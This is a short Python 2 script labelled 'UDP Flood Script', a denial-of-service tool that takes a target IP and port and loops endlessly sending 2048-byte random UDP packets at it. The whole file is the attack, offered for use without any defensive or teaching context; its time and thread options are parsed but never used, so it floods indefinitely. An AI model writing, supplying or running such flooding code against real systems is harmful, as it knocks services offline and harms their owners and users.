import socket,os,random,argparse,sys


def arguments():
    global argss
    parser = argparse.ArgumentParser(description="UDP Flood Script")
    parser.add_argument('-t','--target',help="IP of target", type=str, metavar="<ip>")
    parser.add_argument('-p','--port',help="Port to attack", type=int, metavar="<port>", default=80)
    parser.add_argument('--time',help="Time in seconds to keep the attack", type=int, metavar="<seconds>",default=120)
    parser.add_argument('--threads',help="Quantity of process to start", type=int, metavar="<quantity>", default=1)
    argss = parser.parse_args()
    if argss.target is None:
        sys.exit(parser.print_help())


def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while  True:
        pass
        bytess = random._urandom(2048)
        sock.sendto(bytess, (argss.target,argss.port))
        print "bytes sended"

if __name__ == '__main__':
    arguments()
    attack()
